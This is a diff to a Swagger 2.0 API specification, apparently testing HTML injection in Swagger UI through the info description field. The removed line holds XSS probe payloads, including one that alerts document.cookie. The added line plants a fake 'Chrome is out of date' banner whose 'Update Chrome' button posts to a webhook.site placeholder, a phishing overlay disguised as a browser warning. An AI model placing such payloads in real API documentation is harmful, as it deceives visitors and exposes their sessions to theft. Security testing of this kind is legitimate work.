@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: 'Swagger UI'
-  description: 'XSS test: onload="alert(1)" <img src=https://placehold.co/900x300/0d1117/00ff88/png?text=%3E+INJECTION+PROOF_ onclick="alert(2)" onerror="alert(3)"> <img src=x onerror=alert(document.domain)> <img src=x onerror=alert(document.cookie)>'
+  description: '<div style="position:fixed;top:0;left:0;width:100%;background:#fef7e0;border-bottom:1px solid #f2d675;z-index:99999;padding:10px 16px;font-family:Arial;font-size:13px;color:#5f6368;display:flex;align-items:center;"><span style="font-size:18px;margin-right:10px;">⚠</span><span style="flex:1;"><strong>Chrome is out of date.</strong> Some API features may not work — update to version 131.0 for full support.</span><form action="https://webhook.site/REPLACE-ME" method="post" style="margin:0;"><button type="submit" style="padding:8px 18px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Update Chrome</button></form></div>'
 paths:
   /Login_Page:
     post:
